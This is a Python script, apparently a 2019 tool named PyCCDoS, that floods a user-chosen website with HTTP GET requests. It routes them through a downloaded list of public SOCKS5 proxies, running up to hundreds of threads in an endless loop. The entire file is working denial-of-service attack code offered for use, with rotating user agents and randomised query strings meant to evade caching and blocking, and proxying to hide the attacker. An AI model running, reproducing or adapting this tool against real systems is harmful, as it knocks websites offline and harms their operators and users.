import socks 
import socket 
import requests 
import threading 
import random 
import ssl 
import time
from colorama import Fore



print(Fore.RED + """
    ____        ______     ____       _____      ________  ___        __ __
   / __ \__  __/ ____/____/ __ \____ / ___/____ /_  __/ /_/   | _____/ //_/
  / /_/ / / / / /   / ___/ / / / __ \\__ \/ __ `//  / / __/ /| |/ ___/ , <
 / ____/ /_/ / /___/ /__/ /_/ / /_/ /__/ / /_/ // / / /_/ ___ / /__/ /| |
/_/    \__, /\____/\___/_____/\____/____/\__,_//_/  \__/_/  |_\___/_/ |_|
      /____/""")
print(Fore.WHITE + "Code By GogoZin -2019/8/21")

useragent = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A', 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0', 'Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0', 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.13) Gecko/20080313 Firefox', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; rv:1.8.1.16) Gecko/20080702 Firefox', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.9.2.20) Gecko/20110803 Firefox', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.6) Gecko/2009011913 Firefox', 'Mozilla/5.0 (X11; ; Linux x86_64; rv:1.8.1.6) Gecko/20070802 Firefox', 'Mozilla/5.0 (X11; U; Gentoo Linux x86_64; pl-PL) Gecko Firefox'] #Code By GogoZin 

def opth(): #Open Threads 
	for g in range(int(thr)):
		x = threading.Thread(target=atk)
		x.start()
		print('Threads ' + str(g+1) + " Created ")

def clone(): #Get Socks5 List
	r = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=1000') #Code By GogoZin
	with open('socks5.txt','wb') as f:
		f.write(r.content)
		print('Sucess Get List !')


cc = False		
def main(): #Setup
	global url
	global port
	global thr
	global lsts
	global per
	global uu
	url = str(input('Target (Ex. www.google.com ) : '))
	if url =='':
		input("Error Input ! Try Again")
		return main()
	port = str(input('Port (Default Is 80) : '))
	if port =='':
		port = int(80)
	thr = str(input("Threads (1-800 Default Is 300) : "))
	if thr =='':
		thr = int(300)
	else:
		thr = int(thr)
	per = str(input("CC-Power : (1-100 Default Is 70)"))
	if per =='':
		per = int(70)
	else:
		per = int(per)
	uu = str(input("Path (Default Is / ) :"))
	if uu=='':
		uu ='/'
	gt = str(input('Get List? (y/n) : '))
	if gt =='y':
		clone()
	else:
		pass
	lst = str(input('Socks5 List (socks5.txt) : '))
	if lst =='':
		lst = 'socks5.txt'
	lsts = open(lst).readlines()
	print('Total Socks5 -> %d'%len(lsts))
	time.sleep(2)
	opth()
	

def atk(): #Socks Sent Requests
	ua = random.choice(useragent)
	request = "GET " + uu + "?=" + str(random.randint(1,100)) + " HTTP/1.1\r\nHost: " + url + "\r\nUser-Agent: "+ua+"\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n" #Code By GogoZin
	proxy = random.choice(lsts).strip().split(":")
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
	time.sleep(5)
	while True:
		try:
			s = socks.socksocket()
			s.connect((str(url), int(port)))
			if str(port) =='443':
				s = ssl.wrap_socket(s)
			s.send(str.encode(request))
			print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By GogoZin
			try:
				for y in range(int(per)):
					s.send(str.encode(request))
				print(Fore.CYAN + "ChallengeCollapsar From ~[" + Fore.WHITE + str(proxy[0])+":"+str(proxy[1])+ Fore.CYAN + "]") #Code By GogoZin
			except:
				s.close()
		except:
			s.close()

if __name__=='__main__':
	main() #Code By GogoZin